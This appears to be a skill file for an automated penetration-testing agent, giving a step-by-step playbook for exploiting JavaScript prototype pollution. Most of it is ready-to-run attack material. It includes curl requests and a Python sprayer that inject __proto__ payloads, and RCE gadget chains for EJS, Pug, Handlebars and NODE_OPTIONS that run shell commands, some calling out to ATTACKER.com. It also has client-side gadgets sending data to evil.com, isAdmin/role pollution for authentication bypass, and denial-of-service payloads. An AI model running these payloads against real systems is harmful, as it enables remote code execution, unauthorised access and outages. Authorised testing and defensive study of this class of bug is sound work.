---
name: prototype-pollution
description: JavaScript prototype pollution attacks covering client-side and server-side exploitation, auto-detection scripts, gadget chains for XSS and RCE, and framework-specific bypasses
---

# Prototype Pollution — Expert-Level Testing

Prototype pollution is a JavaScript vulnerability where an attacker modifies `Object.prototype`, causing all objects in the application to inherit attacker-controlled properties. This leads to XSS (client-side), RCE (server-side), authentication bypass, and denial of service.

## Step 1: Identify Potential Injection Points

```bash
# Server-side PP: any endpoint that accepts and merges JSON objects
# Look for: settings, profiles, preferences, configurations, imports, webhooks
curl -sk "https://TARGET/api/user/settings" -X PUT -H "Content-Type: application/json" -d '{}'
curl -sk "https://TARGET/api/profile" -X PATCH -H "Content-Type: application/json" -d '{}'
curl -sk "https://TARGET/api/config" -X POST -H "Content-Type: application/json" -d '{}'

# Client-side PP: any URL parameter processing or hash-based routing
curl -sk "https://TARGET/" | grep -iE "merge|extend|assign|deepCopy|clone|lodash|underscore|jquery"

# Express qs parser (converts query strings to nested objects)
curl -sk "https://TARGET/api/search?test=1"  # Does the app use Express/Node.js?
```

## Step 2: Server-Side Prototype Pollution Detection

```python
#!/usr/bin/env python3
"""Automated server-side prototype pollution detector.
Tests multiple injection vectors and checks for property inheritance."""
import requests, json, time, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET"
# ADJUST THESE: list all endpoints that accept JSON input
ENDPOINTS = [
    ("PUT", "/api/user/settings"),
    ("PATCH", "/api/profile"),
    ("POST", "/api/config"),
    ("POST", "/api/update"),
    ("PUT", "/api/preferences"),
    ("POST", "/api/merge"),
]

# Canary property to detect pollution
CANARY = f"xalgorix_pp_{int(time.time())}"

PAYLOADS = [
    # Standard __proto__ pollution
    {"__proto__": {CANARY: "polluted"}},
    # constructor.prototype path (bypasses __proto__ filters)
    {"constructor": {"prototype": {CANARY: "polluted"}}},
    # Nested pollution
    {"a": {"__proto__": {CANARY: "polluted"}}},
    # Array-like pollution
    {"__proto__": [{CANARY: "polluted"}]},
]

# Headers for JSON requests
headers = {"Content-Type": "application/json"}

for method, path in ENDPOINTS:
    url = f"{TARGET}{path}"
    for i, payload in enumerate(PAYLOADS):
        try:
            if method == "PUT":
                r = requests.put(url, json=payload, headers=headers, verify=False, timeout=10)
            elif method == "PATCH":
                r = requests.patch(url, json=payload, headers=headers, verify=False, timeout=10)
            else:
                r = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)
            
            # Check if canary appears in response
            if CANARY in r.text or "polluted" in r.text:
                print(f"[VULN] Prototype pollution via payload #{i} on {method} {path}!")
                print(f"  Response: {r.text[:200]}")
                continue
        except Exception as e:
            pass

    # Check if pollution persists on a DIFFERENT endpoint (proves Object.prototype was modified)
    try:
        check = requests.get(f"{TARGET}/api/anything", verify=False, timeout=10)
        if CANARY in check.text or "polluted" in check.text:
            print(f"[VULN] Persistent prototype pollution! Canary '{CANARY}' found in unrelated response!")
    except:
        pass

# Also test Express qs parser (query string pollution)
QS_PAYLOADS = [
    f"?__proto__[{CANARY}]=polluted",
    f"?constructor[prototype][{CANARY}]=polluted",
    f"?__proto__.{CANARY}=polluted",
]
for qs in QS_PAYLOADS:
    try:
        r = requests.get(f"{TARGET}/api/search{qs}", verify=False, timeout=10)
        if CANARY in r.text:
            print(f"[VULN] Query string prototype pollution: {qs}")
    except:
        pass

print("[*] Detection complete")
```

## Step 3: Server-Side RCE Gadget Chains

Once pollution is confirmed, escalate to RCE using template engine gadgets:

### EJS Template Engine (Most Common)

```bash
# EJS evaluates 'outputFunctionName' option from Object.prototype
# If EJS is used ANYWHERE in the app, this fires on next template render
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# Then trigger a page render (visit any page that uses EJS):
curl -sk "https://TARGET/"
# If 'uid=...' appears anywhere → RCE confirmed

# Alternative EJS gadget (client option)
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"client":true,"escapeFunction":"1;process.mainModule.require(\"child_process\").execSync(\"curl ATTACKER.com\");s"}}'
```

### Pug (Jade) Template Engine

```bash
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","val":"x]});process.mainModule.require(\"child_process\").execSync(\"id\")//"}}}' 

# Alternative Pug gadget via 'self' mode
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"self":true,"line":"x]});process.mainModule.require(\"child_process\").execSync(\"curl ATTACKER.com\")//"}}'
```

### Handlebars Template Engine

```bash
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"main":"{{#with \"s\" as |string|}}  {{#with \"e\"}}    {{#with split as |conslist|}}      {{this.pop}}      {{this.push (lookup string.sub \"constructor\")}}      {{this.pop}} {{#with string.split as |codelist|}}        {{this.pop}}        {{this.push \"return process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\");\"}}        {{this.pop}}        {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}}      {{/with}}    {{/with}}  {{/with}}{{/with}}"}}'
```

### child_process.spawn/fork via NODE_OPTIONS

```bash
# Pollute shell and NODE_OPTIONS to get RCE when any child process is spawned
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}'

# Alternative: pollute env variables
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}'

# Pollute 'env' for child_process.exec
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ","EVIL":"process.mainModule.require(\"child_process\").execSync(\"curl ATTACKER.com\")"}}}'
```

## Step 4: Client-Side Prototype Pollution → XSS

### Detection via URL Parameters

```bash
# Test if URL params are parsed into objects via merge/extend
# qs, query-string, and URI.js libraries convert ?__proto__[x]=y to objects
curl -sk "https://TARGET/?__proto__[innerHTML]=<img/src/onerror=alert(1)>" 
curl -sk "https://TARGET/?constructor[prototype][innerHTML]=<img/src/onerror=alert(1)>"

# Hash-based pollution
# Navigate in browser: https://TARGET/#__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

### Client-Side XSS Gadgets

```javascript
// jQuery gadget: if $.extend is used to merge URL params
// Pollute: __proto__.innerHTML = "<img src=x onerror=alert(1)>"
// Then any $(element).html(obj.value) renders XSS

// Angular.js gadget:
// Pollute: __proto__.templateUrl = "//evil.com/template"
// Pollute: __proto__.template = "<img src=x onerror=alert(1)>"

// Google Analytics / Tag Manager:
// Pollute: __proto__.transport_url = "//evil.com/collect"
// Exfiltrate tracking data to attacker

// Closure Library:
// Pollute: __proto__.sanitizedContentType = 1

// Script-src based (for CSP bypass):
// Pollute: __proto__.src = "data:,alert(1)"
// Pollute: __proto__.href = "javascript:alert(1)"
```

### Automated Client-Side Detection (Browser Console)

```javascript
// Paste in DevTools to detect client-side prototype pollution
(function(){
    // Save original
    const orig = Object.prototype;
    
    // Test via URL param manipulation
    const testProp = '__pptest_' + Date.now();
    
    // Method 1: Direct proto modification test
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('__proto__[' + testProp + ']')) {
        console.log('[PP] URL param __proto__ detected');
    }
    
    // Method 2: Monitor property additions to Object.prototype
    const handler = {
        set(target, prop, value) {
            if (prop !== 'constructor' && prop !== '__proto__') {
                console.trace(`[PP SINK] Object.prototype.${prop} = ${value}`);
            }
            return Reflect.set(target, prop, value);
        }
    };
    // Note: This only works if Proxy is supported and proto can be proxied
    console.log('[PP] Monitor active — check console for prototype modifications');
})();
```

## Step 5: Authentication/Authorization Bypass via PP

```bash
# If the app checks properties like isAdmin, role, authorized:
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"role":"admin"}}'

curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"authorized":true,"verified":true}}'

# Then check if you now have admin access:
curl -sk "https://TARGET/admin" -H "Cookie: YOUR_SESSION"
```

## Step 6: PP for DoS

```bash
# Pollute toString or valueOf → crashes when any object is coerced to string/number
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"toString":"not_a_function"}}'

# Pollute length → breaks array operations
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"length":99999999}}'
```

## Testing Methodology

1. **Identify merge operations** — find endpoints that accept and merge JSON objects (settings, profiles, configs)
2. **Send __proto__ canary** — `{"__proto__":{"xalgorix_test":"polluted"}}` and check if property appears on subsequent responses
3. **Test constructor.prototype** — alternative path that bypasses __proto__ keyword filters
4. **Check query string** — Express qs parser converts `?__proto__[x]=y` to objects
5. **Identify template engine** — EJS, Pug, Handlebars each have specific RCE gadgets
6. **Try RCE gadgets** — outputFunctionName (EJS), block (Pug), main (Handlebars), NODE_OPTIONS
7. **Test auth bypass** — pollute isAdmin, role, authorized properties
8. **Test client-side** — check if URL params or hash are parsed into objects via merge utilities
9. **Chain with other vulns** — PP + SSRF = RCE on internal Node.js services

## Validation

1. Property set via `__proto__` appears on subsequent unrelated object responses
2. RCE via template engine gadget — command output returned or OOB callback received
3. Client-side XSS triggered via polluted DOM property
4. Auth bypass — isAdmin property inherited from polluted prototype grants elevated access

## Impact

- **Critical**: RCE via server-side pollution + template engine gadgets (EJS/Pug/Handlebars)
- **Critical**: Authentication bypass via isAdmin/role pollution
- **High**: XSS via client-side pollution + DOM gadgets (jQuery, Angular, etc.)
- **Medium**: DoS via polluting toString/valueOf/length

## Pro Tips

1. **`constructor.prototype` bypasses `__proto__` keyword filters** — always test both paths
2. **Express `qs` parser** converts `?__proto__[x]=y` to `{__proto__: {x: "y"}}` — test query strings
3. **Server-side PP often has NO immediate visible effect** — you need to find a GADGET for exploitation
4. **Top gadgets**: `outputFunctionName` (EJS), `block` (Pug), `main` (Handlebars), `shell`/`NODE_OPTIONS` (child_process)
5. **Client-side PP via $.extend, Object.assign, or custom merge** is very common in SPAs
6. **Test with harmless canary first** — `__proto__[xalgorix_test]=true` then check if it propagates
7. **Lodash < 4.17.12, jQuery < 3.4.0** and many npm packages have known PP vulnerabilities
8. **PP can be chained with SSRF** to achieve RCE on internal Node.js services
9. **Use the Python detection script** — save it to a file, edit endpoints, and run it systematically
10. **PP persists across requests** — once Object.prototype is polluted, ALL subsequent objects inherit the property until the server restarts
